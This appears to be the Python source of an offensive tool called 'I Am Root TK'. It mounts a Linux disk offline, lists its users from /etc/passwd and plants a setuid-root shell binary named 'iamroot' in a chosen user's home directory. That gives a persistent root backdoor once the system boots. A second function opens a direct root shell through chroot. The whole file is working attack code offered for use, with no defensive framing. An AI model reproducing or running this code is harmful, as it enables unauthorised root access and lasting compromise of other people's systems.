import subprocess
import os
import sys

LINUX_ROOT = {
    "bin",
    "dev",
    "etc",
    "lib",
    "lost+found",
    "tmp",
    "usr"
}

def run_chroot(chroot, cmd):
    proc = subprocess.Popen(f"sudo chroot {chroot} {cmd}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    proc.wait()
    out, err = proc.communicate()
    if err:
        raise RuntimeError(err)
    return out.decode("utf-8")

def is_linux(device):
    try:
        ls_output = subprocess.check_output(["debugfs", "-R", "\"ls -l\"", device]).decode("utf-8")
    except subprocess.CalledProcessError as e:
        print(e)
        return False
    ls_lines = ls_output.split("\n")
    ls_contents = set([i.split(" ")[-1] for i in ls_lines])
    if LINUX_ROOT.intersection(ls_contents) == LINUX_ROOT: # LINUX_ROOT is fully contained in ls_contents
        return True
    else:
        return False

def roothack_linux(mountpoint):
    print("Linux roothack")
    print("Loading users...")
    uid_min = int(run_chroot(mountpoint, "awk '/^UID_MIN/ {print $2}' /etc/login.defs"))
    uid_max = int(run_chroot(mountpoint, "awk '/^UID_MAX/ {print $2}' /etc/login.defs"))
    print(f"Min UID: {uid_min}")
    print(f"Max UID: {uid_max}")
    users = []
    with open(os.path.join(mountpoint, "etc/passwd")) as f:
        for line in f:
            uname, passwd, uid, gid, longname, homedir, cmd = line.split(":")
            uid, gid = int(uid), int(gid)
            if uid_min <= uid <= uid_max:
                users.append((uname, homedir))
    users.append(("all", "/usr/share"))
    print(f"Found {len(users)-1} users")
    for ind, userdata in enumerate(users):
        username, home = userdata
        if os.path.exists(os.path.join(mountpoint, home, "iamroot")):
            print(f"[{ind}] {username} ({home}) (roothacked)")
        else:
            print(f"[{ind}] {username} ({home})")
    userind = int(input("Select user to give root to: "))
    user = users[userind]
    location_local = mountpoint + os.path.join(user[1], "iamroot")
    location_chroot = os.path.join(user[1], "iamroot")

    print(f"Saving to {location_chroot}...")
    if os.path.exists(location_local):
        print("System is already roothacked")
        if input("Do you wand to remove it (N/y)? ").lower() == "y":
            os.remove(location_local)
            print(f"Removed {location_chroot}")
        exit(0)

    with open("shell", "br") as f: executable = f.read()

    with open(location_local, "bw") as f:
        f.write(executable)

    cmd = f"sh -c \"chown root {location_chroot} & chmod ugo+rx {location_chroot} & chmod u+sx {location_chroot}\""
    print(f"chroot running> {cmd}")
    run_chroot(mountpoint, cmd)

    cmd = f"chmod u+s {location_chroot}"
    print(f"chroot running> {cmd}")
    run_chroot(mountpoint, cmd)

    print("Saved root shell at", location_chroot)
    print("You can now boot back into the os and run:")
    print(location_chroot)

def direct_shell(mountpoint):
    print("### I Am Root TK direct shell by highghlow ###")
    subprocess.Popen(["sudo", "chroot", mountpoint, "sh"], stdout=sys.stdout, stderr=sys.stderr, stdin=sys.stdin).wait()

TOOLS = {
    "Gain root permissions on the os": roothack_linux,
    "Run a shell": direct_shell
}